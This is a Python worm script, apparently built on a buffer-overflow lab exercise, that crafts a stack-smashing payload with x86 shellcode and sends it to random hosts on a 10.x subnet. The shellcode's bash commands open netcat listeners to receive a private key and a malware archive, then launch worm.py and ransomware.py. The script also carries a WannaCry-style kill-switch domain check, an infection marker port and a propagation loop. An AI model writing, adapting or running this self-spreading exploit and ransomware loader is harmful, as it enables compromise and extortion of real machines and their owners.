#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo 'Shellcode is running'; nc -nlv 7070 >master_priv_key&"
   " nc -lnv 8080 > mal.zip; nc -nvlk 5555&  unzip mal.zip;     "
   " python3 ./mal/worm.py&  python3 ./mal/ransomware.py&      *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd614  # Need to change
   offset = 116  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)

def isAttacked(ipaddr:str):
   process = subprocess.run(f"nc -w3 {ipaddr} 5555", shell=True, capture_output=True)
   result = process.returncode
   if result == 0:
      return True
   else:
      return False

def checkKillSwitch():
   domain = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
   process = subprocess.run(f"ping -q -c1 -W1 {domain}", shell=True, capture_output=True)
   result = process.returncode
   if result != 2:
      print(f"KillSwitch is enabled", flush = True)
      return True
   else:
      print(f"KillSwitch is disabled", flush = True)
      return False

# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      ip = ["10", str(randint(150, 171)), "0", str(randint(70, 75))]
      ipaddr = ".".join(ip)
      process = subprocess.run(f"nc -w3 {ipaddr} 9090", shell=True, capture_output=True)
      result = process.returncode

      if result != 0:
         print(f"{ipaddr}:9090 is not alive", flush = True)
         continue
      else:
         print(f"***{ipaddr}:9090 is alive", flush=True)
         if isAttacked(ipaddr):
            print(f"***{ipaddr}:9090 is attacked already", flush=True)
            continue
         else:
            print(f"***{ipaddr}:9090 is not attacked yet, launch the attack", flush=True)
            return ipaddr


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# This is for checking KillSwitch Domain
print(f"***************************************", flush=True)
print(f">>>>> Checking KillSwitch Domain <<<<<", flush=True)
print(f"***************************************", flush=True)
if checkKillSwitch():
   print(f">>>>> Attack Terminated <<<<<", flush=True)
   exit(0)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
    subprocess.run([f"cat mal.zip | nc -w5 {targetIP} 8080"], shell=True)
    # Give the shellcode some time to run on the target host
    time.sleep(1)


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
